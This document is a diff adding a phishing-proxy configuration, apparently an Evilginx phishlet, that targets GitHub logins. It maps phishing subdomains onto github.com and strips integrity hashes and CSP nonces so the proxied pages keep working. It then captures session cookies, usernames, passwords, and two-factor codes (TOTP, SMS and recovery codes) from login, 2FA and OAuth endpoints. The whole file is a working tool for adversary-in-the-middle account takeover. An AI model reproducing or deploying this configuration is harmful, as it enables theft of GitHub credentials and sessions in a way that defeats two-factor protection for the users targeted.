@@ -1,0 +1,52 @@
+min_ver: '3.0.0'
+author: '0fukuAkz'
+
+proxy_hosts:
+  # Main GitHub — orig_sub 'www' so login.domain validation can resolve to www.github.com
+  - {phish_sub: 'github', orig_sub: 'www', domain: 'github.com', session: true, is_landing: true, auto_filter: true}
+  # Avatar CDN — no auth, just assets
+  - {phish_sub: 'avatars', orig_sub: 'avatars', domain: 'githubusercontent.com', session: false, is_landing: false, auto_filter: false}
+
+sub_filters:
+  # Strip SRI integrity hashes — auto_filter rewrites CDN JS, breaking the hash
+  - {triggers_on: 'www.github.com', orig_sub: 'www', domain: 'github.com', search: ' integrity="[^"]*"', replace: '', mimes: ['text/html']}
+  - {triggers_on: 'www.github.com', orig_sub: 'www', domain: 'github.com', search: ' integrity=''[^'']*''', replace: '', mimes: ['text/html']}
+  # Strip CSP nonce attributes
+  - {triggers_on: 'www.github.com', orig_sub: 'www', domain: 'github.com', search: ' nonce="[^"]*"', replace: '', mimes: ['text/html']}
+  - {triggers_on: 'www.github.com', orig_sub: 'www', domain: 'github.com', search: ' nonce=''[^'']*''', replace: '', mimes: ['text/html']}
+  # Rewrite all github.com origin references in proxied responses
+  - {triggers_on: 'www.github.com', orig_sub: 'www', domain: 'github.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+
+auth_tokens:
+  - domain: '.github.com'
+    keys: ['user_session', '__Host-user_session_same_site,opt', '_gh_sess,opt', 'dotcom_user,opt', 'logged_in,opt', '_octo,opt', 'tz,opt']
+    type: 'cookie'
+
+credentials:
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'post'
+
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+  custom:
+    # TOTP 2FA (authenticator app)
+    - {key: 'otp', search: '(.*)', type: 'post'}
+    # SMS 2FA
+    - {key: 'sms-code', search: '(.*)', type: 'post'}
+    # Recovery code
+    - {key: 'recovery_code', search: '(.*)', type: 'post'}
+
+auth_urls:
+  - '/session'
+  - '/sessions/two-factor'
+  - '/sessions/recovery'
+  - '/login/oauth/authorize'
+
+login:
+  domain: 'www.github.com'
+  path: '/login'
